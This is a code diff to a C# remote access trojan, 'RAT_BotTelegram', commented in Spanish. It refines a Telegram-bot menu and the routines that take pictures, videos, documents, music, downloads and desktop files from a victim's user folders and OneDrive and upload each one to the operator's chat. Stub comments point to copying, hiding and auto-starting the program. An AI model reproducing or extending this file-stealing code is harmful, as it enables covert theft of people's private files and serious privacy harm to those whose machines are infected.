@@ -24,6 +24,7 @@ namespace RAT_BotTelegram {
 
             // Copiar
             // Esconder
+            // Iniciar script
 
             //Método que se ejecuta cuando se recibe un mensaje
             Bot.OnMessage += BotOnMessageReceived;
@@ -68,74 +69,37 @@ namespace RAT_BotTelegram {
                 case "/Get_Files":  // Menú Obtiene archivos
                     var GetFiles = new InlineKeyboardMarkup(new[]{
                     new[]{
-                        InlineKeyboardButton.WithCallbackData(
-                            text: "|USER| Get Pictures",
-                            callbackData: "GetPictures"),
-                        InlineKeyboardButton.WithCallbackData(
-                            text: "|USER| Get Videos",
-                            callbackData: "GetVideos"),
+                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Pictures"   ,callbackData: "GetPictures"),
+                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Videos"     ,callbackData: "GetVideos"),
                     },new[]{
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"|USER| Get Documents",
-                            callbackData: "GetDocument"),
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"|USER| Get Music",
-                            callbackData: "GetMusic"),
+                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Documents"  ,callbackData: "GetDocument"),
+                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Music"      ,callbackData: "GetMusic"),
                     },new[]{
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"|USER| Get Download",
-                            callbackData: "getDownload"),
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"|USER| Get Desktop",
-                            callbackData: "getDesktop")
+                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Download"   ,callbackData: "getDownload"),
+                        InlineKeyboardButton.WithCallbackData(text: "|USER| Get Desktop"    ,callbackData: "getDesktop")
                     }});
                     var GetFilesOneDrive = new InlineKeyboardMarkup(new[]{
                     new[]{
-                        InlineKeyboardButton.WithCallbackData(
-                            text: "|OneDrive| Get Pictures",
-                            callbackData: "GetPicturesO"),
-                        InlineKeyboardButton.WithCallbackData(
-                            text: "|OneDrive| Get Videos",
-                            callbackData: "GetVideosO"),
+                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Pictures"   ,callbackData: "GetPicturesO"),
+                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Videos"     ,callbackData: "GetVideosO"),
 
                     },new[]{
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"|OneDrive| Get Documents",
-                            callbackData: "GetDocumentO"),
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"|OneDrive| Get Music",
-                            callbackData: "GetMusicO"),
+                        InlineKeyboardButton.WithCallbackData(text:"|OneDrive| Get Documents"   ,callbackData: "GetDocumentO"),
+                        InlineKeyboardButton.WithCallbackData(text:"|OneDrive| Get Music"       ,callbackData: "GetMusicO"),
                     },new[]{
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"|OneDrive| Get Desktop",
-                            callbackData: "getDesktopO"),
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"Get all files from OneDrive",
-                            callbackData: "getAllO")
+                        InlineKeyboardButton.WithCallbackData(text:"|OneDrive| Get Desktop"     ,callbackData: "getDesktopO"),
+                        InlineKeyboardButton.WithCallbackData(text:"Get all files from OneDrive",callbackData: "getAllO")
                     }});
                     var GetFilesOneDriveE = new InlineKeyboardMarkup(new[]{
                     new[]{
-                        InlineKeyboardButton.WithCallbackData(
-                            text: "|OneDrive| Get Imagenes",
-                            callbackData: "GetPicturesOE"),
-                        InlineKeyboardButton.WithCallbackData(
-                            text: "|OneDrive| Get Videos",
-                            callbackData: "GetVideosOE"),
-
+                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Imagenes"   ,callbackData: "GetPicturesOE"),
+                        InlineKeyboardButton.WithCallbackData(text: "|OneDrive| Get Videos"     , callbackData: "GetVideosOE"),
                     },new[]{
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"|OneDrive| Get Documentos",
-                            callbackData: "GetDocumentOE"),
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"|OneDrive| Get Música",
-                            callbackData: "GetMusicOE"),
+                        InlineKeyboardButton.WithCallbackData(text:"|OneDrive| Get Documentos"  ,callbackData: "GetDocumentOE"),
+                        InlineKeyboardButton.WithCallbackData(text:"|OneDrive| Get Música"      ,callbackData: "GetMusicOE"),
                     },new[]{
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"|OneDrive| Get Escritorio",
-                            callbackData: "getDesktopOE"),
-                        InlineKeyboardButton.WithCallbackData(
-                            text:"|OneDrive| Todos los archivos",
-                            callbackData: "getAllO")
+                        InlineKeyboardButton.WithCallbackData(text:"|OneDrive| Get Escritorio"  ,callbackData: "getDesktopOE"),
+                        InlineKeyboardButton.WithCallbackData(text:"|OneDrive| Todos los archivos",callbackData: "getAllO")
                     }});
 
                     await Bot.SendTextMessageAsync(config.id, " NOTE: Absolutely all files will be obtained.");
@@ -167,7 +131,11 @@ namespace RAT_BotTelegram {
 
         private static async void BotOnCallbackQueryReceived(object sender, CallbackQueryEventArgs callbackQueryEventArgs) {
             string GetFileName(string dir) {   // Retorna solo el nombre del archivo
-                                              //string path = @"D:\PNG Icons\System Win 10\camera.png";
+
+                if (dir == "[-]") { // Verifica si no hay algún error
+                    return "[-]";
+                }
+                //string path = @"D:\PNG Icons\System Win 10\camera.png";
                 try {
                     /* Utiliza la variable para obtener el ultimo contendor 
                      * =Ejemplo:
@@ -175,17 +143,20 @@ namespace RAT_BotTelegram {
                      * [Despues]  path =  "SoyUnaImagen.png"                                                         */
                     int palabraClave = dir.LastIndexOf(@"\");
                     dir = dir.Substring(palabraClave + 1);
+                    return dir;
                 } catch {
-                    dir = "Hubo un problema"; // Hubo un problema 
+                   return "[-]"; // Hubo un problema 
                 }
-
-                return dir;  // NameFile
+                
             }
             string GetFileType(string File) {
                 /* Utiliza la variable para obtener el ultimo contendor 
                  * =Ejemplo:
                  * [Antes]    path = "SoyUnaImagen.png" 
                  * [Despues]  path =  "[Imagen]"             */
+                if (File =="[-]") {
+                    return "[-]";
+                }
 
                string dir = GetFileName(File);
                //string dir2 = dir;       // Solo antibuggeo
@@ -250,103 +221,110 @@ namespace RAT_BotTelegram {
 
                 return "[-]"; // Extension File
             }
+            bool infoFileZize(string file) {  // Verifica si el archivo no supera los 50MB
+                FileInfo fil = new FileInfo(file);
+                var zise = fil.Length;
+                // Convierte var en int 
+                int MB = int.Parse(zise.ToString());
+                // Ejemplo : 44.6MB = 46792411
+                // Ejemplo : 95.3KB = 497687
+                if (MB >= 49999999) {
+                    return false;   // Supera los 50MB
+                } else {
+                    return true;    // No supera los 50Mb
+                }
+            }
+            bool infoFileZizePhoto(string file) {  // Verifica si el archivo no supera los 50MB
+                FileInfo fil = new FileInfo(file);
+                var zise = fil.Length;
+                // Convierte var en int 
+                int MB = int.Parse(zise.ToString());
+                // Ejemplo : 44.6MB = 46792411
+                // Ejemplo : 95.3KB = 497687
+                if (MB >= 9999999) {
+                    return false;   // Supera los 50MB
+                } else {
+                    return true;    // No supera los 10Mb
+                }
+            }
+            string infoFile(string file) {  // Muestra información detallada del archivo
+                FileInfo fil = new FileInfo(file);
+                var f = fil.Length;
+
+
+                return "";
+            }
 
             async void GetFilesTelegram(string Path) { // Sube los archivos obtenidos a telegram
                 await Bot.SendTextMessageAsync(config.id, "******************** Start ********************** ");
-                string infoFile(string file) {
-                    FileInfo fil = new FileInfo(file);
-                    var f= fil.Length;
-                   
+                if (Tools.GetFile(Path).GetValue(0).ToString() == "[-]") {
+                    await Bot.SendTextMessageAsync(config.id, "La carpeta no existe!!");
+                } else {
+                    foreach (var file in Tools.GetFile(Path)) {
 
-                    return "";
-                }
-                bool infoFileZize(string file) {  // Verifica si el archivo no supera los 50MB
-                    FileInfo fil = new FileInfo(file);
-                    var zise = fil.Length;
-                    // Convierte var en int 
-                    int MB = int.Parse(zise.ToString());
-                    // Ejemplo : 44.6MB = 46792411
-                    // Ejemplo : 95.3KB = 497687
-                    if (MB >= 49999999) {
-                        return false;   // Supera los 50MB
-                    } else {
-                        return true;    // No supera los 50Mb
-                    }
-                }
-                bool infoFileZizePhoto(string file) {  // Verifica si el archivo no supera los 50MB
-                    FileInfo fil = new FileInfo(file);
-                    var zise = fil.Length;
-                    // Convierte var en int 
-                    int MB = int.Parse(zise.ToString());
-                    // Ejemplo : 44.6MB = 46792411
-                    // Ejemplo : 95.3KB = 497687
-                    if (MB >= 9999999) {
-                        return false;   // Supera los 50MB
-                    } else {
-                        return true;    // No supera los 10Mb
-                    }
-                }
-                foreach (var file in Tools.GetFile(Path)) {
+                        if (infoFileZize(file)) {
 
-                    if (infoFileZize(file)) {
-
-                        switch (GetFileType(file)) {
-                            case "[Imagen]":
-                                if (infoFileZizePhoto(file)) {
-                                    try {
-                                        await Bot.SendPhotoAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
-                                    } catch {
-                                        // Enviar como documento.
-                                        await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir la imagen, " + GetFileName(file));
+                            switch (GetFileType(file)) {
+                                case "[Imagen]":
+                                    if (infoFileZizePhoto(file)) {
+                                        try {
+                                            await Bot.SendPhotoAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
+                                        } catch {
+                                            // Enviar como documento.
+                                            await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir la imagen, " + GetFileName(file));
+                                        }
+                                    } else {
+                                        try {
+                                            await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
+                                        } catch {
+                                            // Enviar como documento.
+                                            await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir la imagen, " + GetFileName(file));
+                                        }
                                     }
-                                } else {
+                                    break;
+                                case "[Video]":
+                                    try {
+                                        await Bot.SendVideoAsync(config.id, File.Open(file, FileMode.Open));
+                                    } catch {
+                                        await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el video, " + GetFileName(file));
+
+                                    }
+                                    break;
+                                case "[Audio]":
+                                    try {
+                                        await Bot.SendAudioAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
+                                    } catch (Exception) {
+                                        await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el audio, " + GetFileName(file));
+                                    }
+                                    break;
+                                case "[Doc]":
                                     try {
                                         await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
-                                    } catch {
-                                        // Enviar como documento.
-                                        await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir la imagen, " + GetFileName(file));
+                                    } catch (Exception) {
+                                        await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
                                     }
-                                }
-                                break;
-                            case "[Video]":
-                                try {
-                                    await Bot.SendVideoAsync(config.id, File.Open(file, FileMode.Open));
-                                } catch {
-                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el video, " + GetFileName(file));
-
-                                }
-                                break;
-                            case "[Audio]":
-                                try {
-                                    await Bot.SendAudioAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
-                                } catch (Exception) {
-                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el audio, " + GetFileName(file));
-                                }
-                                break;
-                            case "[Doc]":
-                                try {
-                                    await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
-                                } catch (Exception) {
-                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
-                                }
-                                break;
-                            case "[System]": // El archivo se omitidos
-                                try {
-                                    await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
-                                } catch (Exception) {
-                                    await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
-                                }
-                                break;
-                            default:
-                                await Bot.SendTextMessageAsync(config.id, "Se ignoró el archivo " + GetFileName(file));
-                                break;
+                                    break;
+                                case "[System]": // El archivo se omitidos
+                                    try {
+                                        await Bot.SendDocumentAsync(config.id, File.Open(file, FileMode.Open), GetFileName(file));
+                                    } catch (Exception) {
+                                        await Bot.SendTextMessageAsync(config.id, "Hubo un Error al subir el archivo, " + GetFileName(file));
+                                    }
+                                    break;
+                                default:
+                                    await Bot.SendTextMessageAsync(config.id, "Se ignoró el archivo " + GetFileName(file));
+                                    break;
+                            }
+                        } else {
+                            await Bot.SendTextMessageAsync(config.id, "El Archivo supera los 50MB, Por restriciones del API de telegram, éste archivo no se puede envíar" + GetFileName(file));
                         }
-                    } else {
-                        await Bot.SendTextMessageAsync(config.id, "El Archivo supera los 50MB, Por restriciones del API de telegram, éste archivo no se puede envíar" + GetFileName(file));
-                    }
 
-                    await Bot.SendTextMessageAsync(config.id, file);
+                        await Bot.SendTextMessageAsync(config.id, file);
+                    }
                 }
+
+
+                
                 await Bot.SendTextMessageAsync(config.id, "******************** Finish ********************* ");
             }
 
